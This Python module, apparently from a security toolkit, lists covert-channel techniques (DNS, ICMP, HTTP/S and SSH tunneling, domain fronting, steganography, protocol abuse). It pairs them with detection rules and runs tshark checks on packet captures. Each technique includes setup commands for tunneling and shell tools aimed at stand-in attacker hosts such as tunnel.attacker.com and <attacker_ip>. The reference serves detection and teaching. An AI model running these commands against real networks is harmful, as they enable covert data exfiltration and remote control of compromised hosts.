#!/usr/bin/env python3
"""AEGIS Covert Channel Reference and Tools — DNS/ICMP/HTTP tunneling, protocol abuse."""
import os, sys, subprocess
from datetime import datetime

class CovertChannel:
    name = "Covert Channel Tools"
    description = "DNS/ICMP/HTTP tunneling reference, covert communication setup and detection"
    category = "crypto"
    mitre = ["T1572", "T1071", "T1095", "T1001"]

    CHANNELS = [
        {
            "name": "DNS Tunneling",
            "method": "Encode data in DNS queries/responses to attacker-controlled domain",
            "tools": ["iodine", "dnscat2", "dns2tcp", "DNSExfiltrator"],
            "setup": {
                "server": "iodined -f -c -P password 10.0.0.1 tunnel.attacker.com",
                "client": "iodine -f -P password tunnel.attacker.com",
                "dnscat2_server": "ruby dnscat2.rb tunnel.attacker.com",
                "dnscat2_client": "./dnscat --domain tunnel.attacker.com",
            },
            "bandwidth": "~50 KB/s (iodine), ~10 KB/s (dnscat2)",
            "stealth": "Medium-High (DNS traffic is expected, but volume/entropy anomalous)",
            "detection": [
                "High volume of DNS queries to a single domain",
                "Long DNS query labels (>50 chars)",
                "High entropy in DNS query/response data",
                "TXT/NULL/CNAME record type abuse",
                "Unusual query frequency (>100 queries/min to one domain)",
                "Sigma: dns_query | where query_length > 50 AND answer_type in ('TXT','NULL')",
                "Splunk: index=dns | eval len=len(query) | where len>50 | stats count by query",
            ],
            "mitre": "T1071.004",
        },
        {
            "name": "ICMP Tunneling",
            "method": "Encode data in ICMP echo request/reply payload fields",
            "tools": ["ptunnel", "icmpsh", "hans"],
            "setup": {
                "ptunnel_server": "ptunnel -x password",
                "ptunnel_client": "ptunnel -p <proxy> -lp 8000 -da <dest> -dp 22 -x password",
                "icmpsh_server": "python icmpsh_m.py <attacker_ip> <victim_ip>",
                "icmpsh_client": "icmpsh.exe -t <attacker_ip>",
                "hans_server": "hans -s 10.0.0.0 -p password",
                "hans_client": "hans -c <server> -p password",
            },
            "bandwidth": "~10-50 KB/s",
            "stealth": "Medium (ICMP is sometimes blocked; unusual volume detectable)",
            "detection": [
                "Large ICMP echo payloads (>64 bytes)",
                "High frequency of ICMP traffic to single destination",
                "ICMP traffic during non-business hours",
                "Asymmetric request/reply payload sizes",
                "Snort: alert icmp any any -> any any (dsize:>100; msg:'Large ICMP payload'; sid:1000001;)",
            ],
            "mitre": "T1095",
        },
        {
            "name": "HTTP/S Tunneling",
            "method": "Tunnel arbitrary traffic inside HTTP/S requests to blend with normal web traffic",
            "tools": ["Chisel", "reGeorg", "Neo-reGeorg", "ABPTTS", "Tunna", "pivotnacci"],
            "setup": {
                "chisel_server": "chisel server --reverse --port 8080",
                "chisel_client": "chisel client <server>:8080 R:socks",
                "regeorg_deploy": "Upload tunnel.aspx/php/jsp to webserver",
                "regeorg_connect": "python reGeorgSocksProxy.py -p 1080 -u http://target/tunnel.aspx",
                "neoregeorg_gen": "python neoreg.py generate -k password",
                "neoregeorg_connect": "python neoreg.py -k password -u http://target/tunnel.php",
            },
            "bandwidth": "High (limited by HTTP connection speed)",
            "stealth": "High (blends with normal HTTPS traffic, especially with domain fronting)",
            "detection": [
                "Persistent HTTP connections with unusual patterns",
                "POST requests with large/encoded payloads to single endpoint",
                "Regular beacon intervals in HTTP traffic",
                "User-agent anomalies",
                "JA3/JA3S fingerprint matching known tunneling tools",
            ],
            "mitre": "T1071.001",
        },
        {
            "name": "SSH Tunneling",
            "method": "Use SSH port forwarding and SOCKS proxy to tunnel traffic",
            "tools": ["ssh", "sshuttle", "autossh"],
            "setup": {
                "local_forward": "ssh -L 8080:internal-host:80 user@jump-box",
                "remote_forward": "ssh -R 4444:localhost:4444 user@attacker",
                "dynamic_socks": "ssh -D 1080 -N user@jump-box",
                "sshuttle": "sshuttle -r user@jump-box 10.0.0.0/24",
                "autossh": "autossh -M 0 -D 1080 -N user@jump-box",
                "proxychains": "proxychains nmap -sT -Pn 10.0.0.0/24",
            },
            "bandwidth": "High",
            "stealth": "Medium (SSH is expected but long sessions and data volume anomalous)",
            "detection": [
                "Long-duration SSH sessions",
                "SSH to unusual destinations",
                "High data volume over SSH",
                "SSH connections from servers that normally don't SSH out",
            ],
            "mitre": "T1572",
        },
        {
            "name": "Domain Fronting",
            "method": "Use CDN edge servers to hide true C2 destination in TLS SNI vs Host header",
            "tools": ["Custom tools", "Cobalt Strike Malleable C2"],
            "setup": {
                "concept": "TLS SNI: allowed-cdn.com | HTTP Host: hidden-c2.com",
                "cloudfront": "Use CloudFront distribution pointing to C2, SNI shows cloudfront.net",
                "azure": "Use Azure CDN with custom origin pointing to C2",
                "note": "Many CDN providers have blocked this technique since 2018-2020",
            },
            "bandwidth": "Medium-High",
            "stealth": "Very High (traffic appears to go to legitimate CDN)",
            "detection": [
                "TLS SNI vs HTTP Host header mismatch (requires TLS inspection)",
                "Unusual CDN usage patterns",
                "JA3 fingerprints matching known C2 frameworks",
                "Behavioral analysis of CDN traffic patterns",
            ],
            "mitre": "T1090.004",
        },
        {
            "name": "Steganographic Channel",
            "method": "Hide data in images/media uploaded to public platforms",
            "tools": ["steghide", "openstego", "custom LSB tools"],
            "setup": {
                "embed": "steghide embed -cf image.jpg -ef secret.txt -p password",
                "extract": "steghide extract -sf image.jpg -p password",
                "workflow": "1. Embed data in image 2. Upload to public platform 3. C2 downloads and extracts",
            },
            "bandwidth": "Very Low (~1 KB per image)",
            "stealth": "Very High (nearly impossible to detect at scale)",
            "detection": [
                "Statistical analysis of images (chi-square, RS analysis)",
                "Unusual image upload patterns",
                "Monitoring known steganography tool artifacts",
                "Image re-encoding by platforms may destroy hidden data (defense)",
            ],
            "mitre": "T1001.002",
        },
        {
            "name": "Protocol Abuse (NTP/SNMP/DNS)",
            "method": "Abuse legitimate protocols to carry covert data",
            "tools": ["Custom scripts"],
            "setup": {
                "ntp_exfil": "Encode data in NTP reference ID and extension fields",
                "snmp_exfil": "Use SNMP SET/GET with custom OIDs to carry data",
                "smtp_exfil": "Encode data in email headers (X- headers, Message-ID)",
            },
            "bandwidth": "Very Low",
            "stealth": "High (protocols are expected on most networks)",
            "detection": [
                "Unusual NTP server destinations",
                "SNMP traffic to unexpected hosts",
                "Email header anomalies",
                "Protocol-specific content analysis",
            ],
            "mitre": "T1071",
        },
    ]

    def __init__(self, target=None, options=None):
        self.target = target
        self.options = options or {}
        self.findings = []
        self.actions = []

    def _log(self, msg):
        self.actions.append({"time": datetime.now().isoformat(), "action": msg})
        print(f"  [COVERT] {msg}")

    def list_channels(self):
        print("\n  COVERT CHANNEL REFERENCE")
        print("  " + "=" * 60)
        for ch in self.CHANNELS:
            print(f"\n  [{ch['name']}]")
            print(f"  Method: {ch['method']}")
            print(f"  Tools: {', '.join(ch['tools'])}")
            print(f"  Bandwidth: {ch['bandwidth']}")
            print(f"  Stealth: {ch['stealth']}")
            print(f"  MITRE: {ch['mitre']}")
            print(f"  Setup commands:")
            for k, v in ch['setup'].items():
                print(f"    {k}: {v}")
            print(f"  Detection methods:")
            for d in ch['detection']:
                print(f"    - {d}")
        return self.CHANNELS

    def detect_covert(self, pcap_path=None, confirm_fn=None):
        checks = []
        if pcap_path and os.path.isfile(pcap_path):
            if confirm_fn and not confirm_fn(f"Analyze {pcap_path} for covert channels?"):
                return {"status": "cancelled"}
            tshark_checks = [
                ("DNS tunneling", "tshark -r {pcap} -Y 'dns' -T fields -e dns.qry.name | awk '{{print length, $0}}' | sort -rn | head -20"),
                ("ICMP payload size", "tshark -r {pcap} -Y 'icmp' -T fields -e data.len | sort -rn | head -20"),
                ("HTTP beaconing", "tshark -r {pcap} -Y 'http.request' -T fields -e frame.time_relative -e http.host | head -50"),
                ("Large DNS TXT", "tshark -r {pcap} -Y 'dns.txt' -T fields -e dns.txt | head -20"),
            ]
            for name, cmd in tshark_checks:
                try:
                    result = subprocess.run(
                        cmd.format(pcap=pcap_path), shell=True,
                        capture_output=True, timeout=30
                    )
                    output = result.stdout.decode().strip()
                    if output:
                        checks.append({"check": name, "output": output[:500]})
                except Exception:
                    checks.append({"check": name, "status": "tshark not available"})
            self._log(f"Covert channel analysis of {pcap_path}: {len(checks)} checks run")
        else:
            self._log("No PCAP provided. Showing reference only.")
            return self.list_channels()
        return checks

    def run(self, confirm_fn=None):
        op = self.options.get('operation', 'list')
        if op == 'list':
            return self.list_channels()
        elif op == 'detect':
            return self.detect_covert(self.target, confirm_fn)
        return {"error": f"Unknown operation: {op}"}

    def get_findings(self):
        return self.findings

if __name__ == "__main__":
    cc = CovertChannel()
    if len(sys.argv) > 1 and sys.argv[1] == 'detect' and len(sys.argv) > 2:
        cc.detect_covert(sys.argv[2])
    else:
        cc.list_channels()
